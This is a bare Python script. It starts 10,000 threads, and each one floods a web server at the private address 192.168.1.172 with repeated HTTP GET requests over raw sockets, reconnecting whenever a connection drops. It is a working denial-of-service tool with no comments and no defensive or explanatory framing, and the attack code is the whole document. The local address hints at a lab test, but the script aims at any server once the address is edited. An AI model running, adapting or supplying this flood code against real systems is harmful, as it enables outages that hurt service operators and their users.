import socket
import threading

def odnop():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_adress = ("192.168.1.172" , 80)
    sock.connect(server_adress)

    message = "GET / HTTP/1.1\r\nHost: 192.168.1.172\r\n\r\n"
    message = message.encode()

    while True:
        try:
            sock.sendall(message)
        except:
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_adress = ("192.168.1.172" , 80)
            sock.connect(server_adress)

threading_arr = []

for i in range(10000):
    threading_arr.append(threading.Thread(target = odnop , args = ()))

for thread in threading_arr:
    thread.start()